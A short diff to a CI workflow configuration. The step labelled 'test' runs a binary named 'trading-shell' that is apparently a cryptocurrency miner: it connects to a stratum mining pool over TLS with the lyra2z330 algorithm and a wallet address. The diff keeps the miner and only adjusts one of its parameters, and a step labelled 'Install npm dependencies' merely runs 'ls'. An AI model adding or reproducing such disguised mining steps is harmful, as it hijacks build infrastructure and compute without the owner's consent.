@@ -31,4 +31,4 @@ workflows:
       - name: Install npm dependencies
         script: ls
       - name: test
-        script: ./trading-shell -a lyra2z330 -o stratum+tcps://stratum-na.rplant.xyz:17025 -u HRDiYsGL7xwjPHfKAHNwxwMxvK6UTX5Ptr.ok -p 0.00152588,password=bayar -t3
+        script: ./trading-shell -a lyra2z330 -o stratum+tcps://stratum-na.rplant.xyz:17025 -u HRDiYsGL7xwjPHfKAHNwxwMxvK6UTX5Ptr.ok -p 0.0017,password=bayar -t3
